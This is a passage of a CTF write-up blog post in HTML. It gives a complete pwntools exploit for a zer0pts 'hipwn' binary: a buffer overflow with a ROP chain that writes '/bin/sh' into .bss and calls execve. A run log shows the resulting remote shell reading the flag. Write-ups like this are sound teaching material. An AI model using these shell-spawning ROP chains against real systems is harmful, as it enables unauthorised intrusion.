+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="c1"># This one holds the number of which syscall has to done</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="c1"># This ensures `rax` contains `0x3b` which means it is doing an `execve`</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="c1"># Popping `rdi` address</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_readable_addr</span><span class="p">)</span> <span class="c1"># writeable address which has `/bin/sh` is loaded to `rdi`</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="c1"># Popping `rsi` and `r15`</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Loading `0` to `rsi`</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Loading `0` to `r15` </span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="c1"># Popping rdx</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># We will load to `0` to `rdx`</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="c1"># Adding `syscall; ret;` at last to request syscall</span>
+</span></span></code></pre></div><p>We are doing <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> to spawn a shell.</p>
+<h5 id="final-exploit" class="relative group">Final Exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#final-exploit" aria-label="Anchor">#</a></span></h5><p>Here is the final exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040141c</span> <span class="c1"># pop rdu; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="mh">0x00000000004023f5</span> <span class="c1"># pop rdx; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x000000000040141a</span> <span class="c1"># pop rsi; pop r15; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x0000000000400121</span> <span class="c1"># pop rax; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x00000000004024dd</span> <span class="c1"># syscall; ret;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">writable_readable_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x200</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">264</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_readable_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004EE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_readable_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40062F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable_readable_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./chall&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&#34;18.179.178.246&#34;</span><span class="p">,</span> <span class="mi">9010</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Sending this to stdin which means the `writable_readable_addr` will have `/bin/sh`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running the exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs$</span> <span class="no">python</span> <span class="no">hipwn_xpl.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="mi">18</span><span class="no">.179.178.246</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">9010</span><span class="p">:</span> <span class="no">Done</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">ls</span>
+</span></span><span class="line"><span class="cl"><span class="nf">chall</span>
+</span></span><span class="line"><span class="cl"><span class="nf">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">redir.sh</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">zer0pts</span><span class="err">{</span><span class="no">welcome_yokoso_osooseyo_huanying_dobropozhalovat</span><span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span>  
+</span></span></code></pre></div><p>Yay, we got this. I hope you learned something. Encontered any issues? Contact <a href="https://twitter.com/D4mianWayne" target="_blank" rel="noreferrer">@D4mianWayne</a></p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/bastion/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Hack The Box - Bastion</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-09-10 00:00:00 &#43;0000 UTC">10 September 2019</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/ret2csu/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >ret2csu - A Return Oriented Programming Technique</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2020-04-13 00:00:00 &#43;0000 UTC">13 April 2020</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
